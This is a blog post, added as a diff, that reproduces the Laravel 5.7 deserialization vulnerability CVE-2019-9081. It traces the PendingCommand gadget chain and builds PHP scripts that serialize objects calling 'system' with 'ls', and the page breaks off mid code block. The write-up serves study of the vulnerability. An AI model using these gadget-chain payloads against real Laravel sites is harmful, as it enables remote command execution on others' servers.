@@ -1,0 +1,759 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305221933187.jpeg">
+  <link rel="icon" href="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305221933187.jpeg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="yring">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CVE-2019-9081 复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Laravel_5.7.* 反序列化复现">
+<meta property="og:url" content="http://example.com/2023/10/07/Laravel/index.html">
+<meta property="og:site_name" content="yring">
+<meta property="og:description" content="CVE-2019-9081 复现">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.nasachina.cn/wp-content/uploads/2023/10/WitchHead_Alharbi_1080.jpg">
+<meta property="article:published_time" content="2023-10-06T16:20:25.000Z">
+<meta property="article:modified_time" content="2023-10-07T12:35:04.146Z">
+<meta property="article:author" content="yring">
+<meta property="article:tag" content="PE">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.nasachina.cn/wp-content/uploads/2023/10/WitchHead_Alharbi_1080.jpg">
+  
+  
+  
+  <title>Laravel_5.7.* 反序列化复现 - yring</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/cloudeGlass.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>yring</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://cdn.pixabay.com/photo/2016/05/24/16/48/mountains-1412683_1280.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Laravel_5.7.* 反序列化复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-07 00:20" pubdate>
+          October 7, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          31 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Laravel_5.7.* 反序列化复现</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on October 7, 2023 pm
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>CVE-2019-9081 复现</p>
+<span id="more"></span>
+
+<h1 id="反序列化链分析"><a href="#反序列化链分析" class="headerlink" title="反序列化链分析"></a>反序列化链分析</h1><h2 id="1-入口"><a href="#1-入口" class="headerlink" title="1. 入口"></a>1. 入口</h2><p>此反序列化漏洞入口位于 Illuminate\Foundation\Testing\PendingCommand destruct() 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;hasExecuted) &#123;<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br>     <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>分析：<code>$this-&gt;hasExecuted</code>默认为false不执行，所以会直接执行<code>  $this-&gt;run()</code>方法，查阅<code>run()</code>方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;hasExecuted = <span class="hljs-literal">true</span>;<br><br>       <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">mockConsoleOutput</span>();<br><br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-variable">$exitCode</span> = <span class="hljs-variable language_">$this</span>-&gt;app[<span class="hljs-title class_">Kernel</span>::<span class="hljs-variable language_">class</span>]-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$this</span>-&gt;command, <span class="hljs-variable">$this</span>-&gt;parameters);<br>       &#125; <span class="hljs-keyword">catch</span> (NoMatchingExpectationException <span class="hljs-variable">$e</span>) &#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMethodName</span>() === <span class="hljs-string">&#x27;askQuestion&#x27;</span>) &#123;<br>               <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">fail</span>(<span class="hljs-string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getActualArguments</span>()[<span class="hljs-number">0</span>]-&gt;<span class="hljs-title function_ invoke__">getQuestion</span>().<span class="hljs-string">&#x27;&quot; was asked.&#x27;</span>);<br>           &#125;<br><br>           <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expectedExitCode !== <span class="hljs-literal">null</span>) &#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">assertEquals</span>(<br>               <span class="hljs-variable">$this</span>-&gt;expectedExitCode, <span class="hljs-variable">$exitCode</span>,<br>               <span class="hljs-string">&quot;Expected status code <span class="hljs-subst">&#123;$this-&gt;expectedExitCode&#125;</span> but received <span class="hljs-subst">&#123;$exitCode&#125;</span>.&quot;</span><br>           );<br>       &#125;<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$exitCode</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>会先经历<code>mockConsoleOutput()</code>方法，查看该方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mockConsoleOutput</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$mock</span> = <span class="hljs-title class_">Mockery</span>::<span class="hljs-title function_ invoke__">mock</span>(<span class="hljs-title class_">OutputStyle</span>::<span class="hljs-variable language_">class</span>.<span class="hljs-string">&#x27;[askQuestion]&#x27;</span>, [<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayInput</span>(<span class="hljs-variable">$this</span>-&gt;parameters)), <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">createABufferedOutputMock</span>(),<br>    ]);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;test-&gt;expectedQuestions <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span> =&gt; <span class="hljs-variable">$question</span>) &#123;<br>        <span class="hljs-variable">$mock</span>-&gt;<span class="hljs-title function_ invoke__">shouldReceive</span>(<span class="hljs-string">&#x27;askQuestion&#x27;</span>)<br>            -&gt;<span class="hljs-title function_ invoke__">once</span>()<br>            -&gt;<span class="hljs-title function_ invoke__">ordered</span>()<br>            -&gt;<span class="hljs-title function_ invoke__">with</span>(<span class="hljs-title class_">Mockery</span>::<span class="hljs-title function_ invoke__">on</span>(function (<span class="hljs-variable">$argument</span>) <span class="hljs-keyword">use</span> (<span class="hljs-variable">$question</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$argument</span>-&gt;<span class="hljs-title function_ invoke__">getQuestion</span>() == <span class="hljs-variable">$question</span>[<span class="hljs-number">0</span>];<br>            &#125;))<br>            -&gt;<span class="hljs-title function_ invoke__">andReturnUsing</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">question</span>, $<span class="hljs-title">i</span>) &#123;<br>                <span class="hljs-title">unset</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">test</span>-&gt;<span class="hljs-title">expectedQuestions</span>[$<span class="hljs-title">i</span>]);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$question</span>[<span class="hljs-number">1</span>];<br>            &#125;);<br>    &#125;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">bind</span>(<span class="hljs-title class_">OutputStyle</span>::<span class="hljs-variable language_">class</span>, function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">mock</span>) &#123;<br>        <span class="hljs-title">return</span> $<span class="hljs-title">mock</span>;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>大体意思就是对<code>$thie-&gt;test</code>和<code>$this-&gt;app</code>成员进行初始化</p>
+<p>简单写个脚本调试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span>  <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Container</span>\<span class="hljs-title">Container</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingCommand</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = [<span class="hljs-string">&#x27;1&#x27;</span>];<span class="hljs-comment">//这里用数组是因为原调用出会有一个foreach遍历</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>\<span class="hljs-title class_">PendingCommand</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PendingCommand</span>(<span class="hljs-string">&#x27;system&#x27;</span>,[<span class="hljs-string">&#x27;ls&#x27;</span>])));<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>这里使用<code>Faker\DefaultGenerator\DefaultGenerator</code>来为<code>test</code> 和<code>app</code>赋值是因为这类的<code>__call()``__get()</code>方法都比较简单</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$attribute</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $method</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> array $attributes</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接报错</p>
+<p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310072022713.png" srcset="/img/loading.gif" lazyload></p>
+<p>问题出在这一句<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code></p>
+<p>也就是之前我们对<code>app</code>的赋值有问题，这里会把<code>app</code>当做一个数组来执行，返回去查看app的说明</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * The application instance.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@var</span> \Illuminate\Foundation\Application</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br></code></pre></td></tr></table></figure>
+
+<p>也就是说，<code>$app</code>是<code> \Illuminate\Foundation\Application</code>的实例，修改一下Payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>\<span class="hljs-title">Application</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingCommand</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Application</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>  <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Application</span>&#123;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = [<span class="hljs-string">&#x27;1&#x27;</span>];<span class="hljs-comment">//这里用数组是因为原调用出会有一个foreach遍历</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>\<span class="hljs-title class_">PendingCommand</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PendingCommand</span>(<span class="hljs-string">&#x27;system&#x27;</span>,[<span class="hljs-string">&#x27;ls&#x27;</span>])));<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>但是继续报错</p>
+<p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310072020182.png" srcset="/img/loading.gif" lazyload></p>
+<p>提示<code>Target [Illuminate\Contracts\Console\Kernel] is not instantiable</code>,也就是说<code>[Illuminate\Contracts\Console\Kernel]</code>这个东西对应的类无法被实例化。</p>
+<p>那么我们单步调试看看</p>
+<p>最终在<code>Illuminate\Container\Container.php</code>的<code>if ($this-&gt;isBuildable($concrete, $abstract))</code>方法报错</p>
+<p>相关代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-variable">$concrete</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getConcrete</span>(<span class="hljs-variable">$abstract</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isBuildable</span>(<span class="hljs-variable">$concrete</span>, <span class="hljs-variable">$abstract</span>)) &#123;<br>  <span class="hljs-variable">$object</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">build</span>(<span class="hljs-variable">$concrete</span>);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-variable">$object</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">make</span>(<span class="hljs-variable">$concrete</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>这里的<code>$abstract</code>就是<code>Illuminate\Contracts\Console\Kernel</code>这个字符串，也就是最前面的<code>Kernel::class</code>所对应的字符串</p>
+<p>来看看这几个方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 